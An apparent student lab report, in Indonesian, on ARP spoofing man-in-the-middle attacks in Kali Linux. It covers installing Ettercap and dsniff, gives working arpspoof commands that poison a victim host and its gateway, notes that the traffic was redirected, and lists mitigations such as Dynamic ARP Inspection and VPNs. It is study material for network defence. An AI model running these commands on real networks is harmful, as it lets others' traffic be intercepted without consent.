ARP Spoofing – Man-in-the-Middle Attack

Experimenter: Lyam
Environment: Kali Linux
Date: 7 November 2025

1. Pendahuluan

ARP Spoofing adalah teknik serangan pada jaringan lokal yang memanfaatkan kelemahan Address Resolution Protocol (ARP) untuk memposisikan penyerang sebagai perantara komunikasi (MITM).

2. Tujuan Praktikum

  • Memahami konsep ARP Spoofing
  • Mempelajari mekanisme Man-in-the-Middle
  • Menguji tools Ettercap dan arpspoof
  • Menganalisis alur lalu lintas data

3. Metodologi ARP Spoofing

Penyerang mengirim ARP reply palsu ke korban dan gateway sehingga seluruh lalu lintas dialihkan melalui mesin penyerang.

4. Implementasi Menggunakan Ettercap

sudo apt update
sudo apt install ettercap-graphical
sudo ettercap -G

5. Implementasi Menggunakan arpspoof

sudo apt install dsniff

sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100

6. Hasil Pengujian

  • Lalu lintas korban berhasil dialihkan
  • Koneksi korban tetap berjalan normal
  • Data dapat dianalisis menggunakan packet sniffer

7. Analisis Keamanan

ARP tidak memiliki mekanisme autentikasi, menjadikannya sangat rentan terhadap serangan MITM pada jaringan lokal.

8. Mitigasi

  • Static ARP
  • Dynamic ARP Inspection
  • VPN
  • IDS/IPS

9. Kesimpulan

ARP Spoofing dapat dilakukan dengan mudah pada jaringan lokal tanpa proteksi. Pemahaman teknik ini penting untuk defensive security.
